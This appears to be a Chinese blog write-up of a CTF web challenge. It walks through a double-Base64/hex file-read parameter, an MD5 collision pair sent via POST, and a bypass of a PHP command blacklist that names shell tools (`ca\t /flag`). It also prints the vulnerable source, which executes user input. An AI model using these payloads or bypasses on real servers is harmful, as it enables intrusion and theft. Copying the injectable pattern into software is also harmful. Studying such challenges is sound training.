# Easy Web


&lt;font size=1&gt;一个比较有趣的题目&lt;/font&gt;

打开抓包的时候那个`cmd=`过于耀眼，所以尝试了`cmd=dir`，不过都没有什么，结果倒是多打了一个`;`得到forbid的响应。旁边响应还有一个耀眼的`base64`。后面那串应该就是Base64编码过的。

  

&lt;!--more--&gt;

  

# base64&amp;hex

  

```http

GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= HTTP/1.1

```

  

进行那段看似乱码的字符串的解码。一个个尝试下了，base64

`TXpVek5UTTFNbVUzTURabE5qYz0`-&gt;`MzUzNTM1MmU3MDZlNjc=`-&gt;`3535352e706e67`

再通过HEX解码得到`555.png`。

  

访问该图片，发现就是那个熊猫哭泣图。

所以回到之前那个Base64编码过的很长的“乱码”——就是这个图片的内容。

  

可能存在文件包含漏洞。

按照找个`555.png`的编码模式对`index.php`进行编码，也就是先HEX再两次Base64。不过翻到官方文档使用了python进行编码，觉得很有意思：

  

```python

import binascii

import base64

filename = input().encode(encoding=&#39;utf-8&#39;)

hex = binascii.b2a_hex(filename)

base1 = base64.b64encode(hex)

base2 = base64.b64encode(base1)

print(base2.decode())

```

  

编码结果为`TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`,再次发送，就会得到`index.php`内容经过base64编码后的内容，解码一下就行了

  

-----

-----

  

# Crack form MD5

  

```php

//index.php

&lt;?php

error_reporting(E_ALL || ~ E_NOTICE);//将所有错误和警告都输出，忽略NOTICE级别错误。

header(&#39;content-type:text/html;charset=utf-8&#39;);

$cmd = $_GET[&#39;cmd&#39;];

if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))//检查是否存在img和cmd参数

    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);//不存在就重定向到该页面

$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));//将img参数进行编/解码后存储到$file中

  

$file = preg_replace(&#34;/[^a-zA-Z0-9.]&#43;/&#34;, &#34;&#34;, $file);//通过正则将文件中非字母、数字字符全部替换为空

if (preg_match(&#34;/flag/i&#34;, $file)) {

    echo &#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;;

    die(&#34;xixi～ no flag&#34;);

} else {

    $txt = base64_encode(file_get_contents($file));//否则进行输出

    echo &#34;&lt;img src=&#39;data:image/gif;base64,&#34; . $txt . &#34;&#39;&gt;&lt;/img&gt;&#34;;

    echo &#34;&lt;br&gt;&#34;;

}

echo $cmd;

echo &#34;&lt;br&gt;&#34;;

//通过正则进行black list检查

if (preg_match(&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;, $cmd)) {

    echo(&#34;forbid ~&#34;);

    echo &#34;&lt;br&gt;&#34;;

} else {

    //否则进行MD5碰撞：首先比较POST请求中的a和b参数是否相等，然后比较它们的MD5哈希值是否相等。如果两个条件都满足，则执行$cmd命令，并输出结果；否则输出&#34;md5 is funny ~&#34;。

    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {

        echo `$cmd`;

    } else {

        echo (&#34;md5 is funny ~&#34;);

    }

}

```

看完其实可以得知的是，要用POST传参

  

## first problem: MD5碰撞

  

参考这个——&lt;a href=https://www.jianshu.com/p/c9089fd5b1ba&gt;MD5碰撞的一些例子&lt;/a&gt;

进行URL编码

```

a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

```

  

## second problem: 绕过黑名单

  
  
  

&gt;dir 命令最基本的用途是列出当前目录的内容，最简单的使用方式是不带任何参数和选项，直接键入 dir，然后回车，默认就会列出当前目录中的内容

  

`dir%20`

```

555.png  bj.png  ctf3.jpeg  index.php

```

----

  

&gt;/表示目录，没有特别指明则输出所有目录名

  

`dir%20/`

  

```

bin   dev  flag  lib    media  opt   root  sbin  sys  usr

boot  etc  home  lib64  mnt    proc  run   srv   tmp  var

```

----

  

&gt;cat（英文全拼：concatenate）命令用于连接文件并打印到标准输出设备上。

  

`ca\t%20/flag`

得到flag

  

------

  

# ファンワイ

  

&lt;a href=https://github.com/iamjazz/Md5collision&gt;MD5碰撞生成生成器&lt;/a&gt;

  

```python

//MD5碰撞生成字典

class batch_Md5():

    def one_md5_encode(self, string):

        md5_data = hashlib.md5()

        md5_data.update(string.encode(&#34;utf-8&#34;))

        print(string &#43;&#34; ===&gt; &#34;&#43;md5_data.hexdigest())

  

    def batch_md5_encode(self, file, outfile):

        for strtmp in file:

            strtmp = strtmp.replace(&#34;\n&#34;, &#34;&#34;)

            time.sleep(1)

            try:

                md5_data = hashlib.md5()

                md5_data.update(str(strtmp).encode(&#34;utf-8&#34;))

                res = md5_data.hexdigest()

                with open(outfile, &#34;a&#34;) as fw:

                    fw.writelines(str(res) &#43; &#34;\n&#34;)

                print(strtmp &#43;&#34; ===&gt; &#34;&#43;res)

            except Exception as e:

                print(&#34;md5加密超时！&#34;)

        return res

  

if(__name__ == &#34;__main__&#34;):

    title()

    parser = argparse.ArgumentParser(description=&#34;Made md5 Dicts Script&#34;)

    parser.add_argument(

        &#39;-s&#39;, &#39;--string&#39;, type=str, metavar=&#34;&#34;,

        help=&#39;Please input strings to md5 encode. eg: afei&#39;

    )

    parser.add_argument(

        &#39;-f&#39;, &#39;--file&#39;, type=argparse.FileType(&#39;r&#39;), metavar=&#34;&#34;,

        help=&#39;Please input file path for batch encode. eg: c:/str.txt&#39;

    )

    parser.add_argument(

        &#39;-o&#39;, &#39;--outfile&#39;, metavar=&#34;&#34;,

        help=&#34;Please input path for output file. eg：c:/output.txt&#34;

    )

    args = parser.parse_args()

    run = batch_Md5()

    if args.string:

        run.one_md5_encode(args.string)

        exit()

    if args.file:

        run.batch_md5_encode(args.file, args.outfile)

    else:

        print(&#34;请输入-h选项查看用法！&#34;)

```


---

> Author:   
> URL: https://66lueflam144.github.io/posts/e69dffe/  

